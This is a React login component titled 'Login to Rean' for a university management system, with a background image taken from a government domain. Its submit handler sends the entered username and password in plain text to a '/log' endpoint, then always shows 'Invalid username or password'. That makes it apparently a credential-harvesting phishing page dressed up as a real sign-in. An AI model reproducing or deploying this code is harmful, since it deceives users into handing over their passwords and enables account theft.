import React, { useState } from "react";
import "bootstrap/dist/css/bootstrap.min.css";

// import "./login.css";

const BACKEND = import.meta.env?.VITE_BACKEND_URL || "http://localhost:5000";

export default function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [msg, setMsg] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await fetch(`${BACKEND}/log`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      setMsg("Invalid username or password");
      setPassword("");
    } catch (err) {
      setMsg("Network error");
      console.error(err);
    }
  };

  return (
    <div className="container-fluid vh-100 p-0">
      <div className="row g-0 h-100">
        {/* Left Side */}
        <div
          className="col-6 left-grid d-flex flex-column justify-content-center align-items-center"
          style={{
            backgroundImage: "url('https://test.rean.gov.kh/v2/8e1bc2a1925d0cfa8a4fad5a8ecdd278.jpg')",
            backgroundSize: "cover",
            backgroundPosition: "center",
            color: "white",
            textAlign: "center",
          }}
        >
          <h2>University Management System</h2>
          <p>
            "Prioritize user experience by creating an intuitive interface
            that is easy to navigate, ensuring quick and hassle-free access
            to the system."
          </p>
          <p>Prepared by</p>
        </div>

        {/* Right Side */}
        <div className="col-6 right-grid d-flex justify-content-center align-items-center">
          <div style={{ width: "80%", maxWidth: "400px" }}>
            <h3 className="mb-4">Login to Rean</h3>
            <form onSubmit={handleSubmit}>
              <div className="mb-3">
                <label className="form-label">Username</label>
                <input
                  type="text"
                  className="form-control"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  required
                />
              </div>

              <div className="mb-3">
                <label className="form-label">Password</label>
                <input
                  type="password"
                  className="form-control"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
              </div>

              {msg && <p className="text-danger">{msg}</p>}

              <button type="submit" className="btn btn-primary w-100">
                Login
              </button>
            </form>
            <p className="mt-3">
              <span>Forgot password?</span>
            </p>
            <p>
              New to Rean?{" "}
              <button type="button" className="btn btn-secondary btn-sm">
                Create an account
              </button>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
